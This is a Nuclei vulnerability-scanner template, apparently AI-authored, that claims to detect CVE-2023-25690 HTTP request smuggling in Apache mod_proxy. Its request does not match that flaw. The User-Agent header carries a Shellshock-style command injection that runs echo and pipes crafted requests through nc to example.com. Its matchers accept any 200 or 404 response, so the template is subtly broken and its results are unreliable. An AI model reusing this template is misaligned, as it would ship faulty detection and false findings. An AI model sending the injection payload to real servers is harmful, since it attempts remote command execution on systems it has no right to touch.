id: CVE-2023-25690

info:
  name: Apache HTTP Server mod_proxy HTTP Request Smuggling
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Some mod_proxy configurations on Apache HTTP Server versions 2.4.0 through 2.4.55 allow a HTTP Request Smuggling attack. Configurations are affected when mod_proxy is enabled along with some form of RewriteRule or ProxyPassMatch in which a non-specific pattern matches some portion of the user-supplied request-target (URL) data and is then re-inserted into the proxied request-target using variable substitution.
  reference:
    - https://github.com/thanhlam-attt/CVE-2023-25690
    - https://github.com/dhmosfunk/CVE-2023-25690-POC
    - https://github.com/tbachvarova/linux-apache-fix-mod_rewrite-spaceInURL
    - http://packetstormsecurity.com/files/176334/Apache-2.4.55-mod_proxy-HTTP-Request-Smuggling.html
  remediation: |
    Users are recommended to update to at least version 2.4.56 of Apache HTTP Server. Review and revise any RewriteRule or ProxyPassMatch configurations to ensure they do not allow request smuggling. Consider implementing additional security controls and input validation to prevent unauthorized access.

http:
  - raw:
      - |
        POST /here/../here HTTP/1.1
        Host: {{Hostname}}
        User-Agent: () { :; }; /bin/echo -e "GET /here/../here HTTP/1.1\r\nHost: www.example.com\r\n\r\nGET /nonexistent HTTP/1.1\r\nHost: www.example.com\r\n\r\n" | nc example.com 80
        Connection: close

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "HTTP/1.1 200 OK"
          - "HTTP/1.1 404 Not Found"
        part: response
      - type: regex
        regex:
          - "HTTP/1.1\\s+200\\s+OK"
          - "HTTP/1.1\\s+404\\s+Not\\s+Found"